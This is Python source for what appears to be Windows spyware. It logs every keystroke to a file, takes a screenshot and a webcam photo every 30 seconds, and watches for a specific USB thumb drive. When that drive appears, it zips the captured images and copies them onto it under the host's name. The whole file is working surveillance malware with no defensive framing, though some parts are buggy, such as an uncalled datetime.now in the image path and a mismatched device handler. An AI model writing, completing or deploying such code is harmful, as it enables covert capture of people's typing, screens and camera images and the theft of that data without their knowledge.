import glob
import io
import os
import socket
import threading
import time
import zipfile
from datetime import datetime

import cv2
import pyautogui
import pywinusb.hid as hid
import win32file
# import requests
from pynput import keyboard

keys = ""


def get_device_name():
    return socket.gethostname()


def zip_files_to_device(file_paths):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zip_file:
        for file_path in file_paths:
            if os.path.exists(file_path):
                zip_file.write(file_path)

    return zip_buffer.getvalue()


def get_flash_drive_mount_point():
    drives = win32file.GetLogicalDrives()
    for drive in range(1, 26):  # Check drive letters from C: to Z:
        if drives & (1 << drive):
            drive_letter = f"{chr(65 + drive)}:"
            drive_type = win32file.GetDriveType(drive_letter)
            if drive_type == win32file.DRIVE_REMOVABLE:
                return drive_letter
    return None


def copy_to_flash_drive(zip_data, flash_drive_path, zip_filename):
    if os.path.exists(flash_drive_path) and os.path.isdir(flash_drive_path):
        with open(os.path.join(flash_drive_path, zip_filename), "wb") as zip_file:
            zip_file.write(zip_data)

        print(f"Successfully copied zip file to {flash_drive_path}")
    else:
        print("Flash drive not found or invalid path.")


def device_insertion_handler(action, device):
    if action == "add" and "usb" in device.subsystem and "block" in device.device_type:
        files_to_zip = glob.glob("*.png") + ["example.txt"]

        zip_filename = f"{get_device_name()}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_files.zip"

        zip_data = zip_files_to_device(files_to_zip)

        flash_drive_path = get_flash_drive_mount_point()

        if flash_drive_path:
            copy_to_flash_drive(zip_data, flash_drive_path, zip_filename)
        else:
            print("Flash drive not found.")


def on_press(key):
    global keys
    keys += f"[{datetime.now()}] {key} pressed\n"


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{datetime.now()}.png")


def take_picture():
    # Initialize the camera
    camera = cv2.VideoCapture(0)  # '0' represents the default camera (usually the built-in webcam)

    # Check if the camera is opened successfully
    if not camera.isOpened():
        print("Failed to open camera")
        exit()

    # Capture a frame from the camera
    ret, frame = camera.read()

    # Check if the frame was captured successfully
    if not ret:
        print("Failed to capture frame")
        exit()

    # Release the camera
    camera.release()

    # Save the captured frame as an image
    image_path = f"{datetime.now}.jpg"
    cv2.imwrite(image_path, frame)

    # Display the path of the captured image
    print("Image captured and saved as:", image_path)


if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        def watch_for_thumb_drive():
            filters = hid.HidDeviceFilter(vendor_id=0x058F,
                                          product_id=0x6387)  # Replace with your thumb drive's vendor and product IDs

            while True:
                all_devices = filters.get_devices()
                if all_devices:
                    device = all_devices[0]
                    device.open()
                    device.set_raw_data_handler(device_insertion_handler)
                    break


        watch_thread = threading.Thread(target=watch_for_thumb_drive)
        watch_thread.start()
        while True:
            time.sleep(30)
            take_screenshot()
            time.sleep(0.1)
            take_picture()
            if len(keys) > 50:
                with open("log.log", "a") as log_file:
                    log_file.write(keys)
                    keys = ""
